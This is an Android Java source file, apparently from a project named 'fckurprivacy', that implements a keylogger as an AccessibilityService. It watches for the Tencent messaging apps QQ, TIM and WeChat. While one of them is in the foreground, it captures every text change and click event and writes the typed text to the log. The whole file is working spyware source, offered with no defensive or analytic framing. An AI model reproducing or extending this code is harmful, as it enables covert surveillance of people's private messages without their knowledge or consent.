package com.vergermiya.harevost.fckurprivacy.KeyLogger;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

/**
 * Created by harevost on 18-7-18.
 */

public class KeyLogger extends AccessibilityService{

    private static String APP_QQ = "com.tencent.qq";
    private static String APP_TIM = "com.tencent.tim";
    private static String APP_MM = "com.tencent.mm";

    private static CharSequence lastPackage = "";

    @Override
    public void onServiceConnected() {
        Log.d("KeyLogger", "Service Started");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        int eventType = event.getEventType();
        CharSequence currentPackage = "";

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().equals("")) {
                currentPackage = event.getPackageName();
                Log.d("KeyLogger.currentPkg", currentPackage.toString());
            }
            if (!currentPackage.equals("")) {
                lastPackage = currentPackage;
                Log.d("KeyLogger.lastPkg", lastPackage.toString());
            }
        }

        if (lastPackage.equals(APP_QQ) || lastPackage.equals(APP_MM) || lastPackage.equals(APP_TIM)) {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    String textData = event.getText().toString();
                    Log.d("KeyLogger", "TEXT:" + textData);
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    String clickedData = event.getText().toString();
                    Log.d("KeyLogger", "CLICKED:" + clickedData);
                    break;
                }
            }
        }
    }

    @Override
    public void onInterrupt() {

    }
}
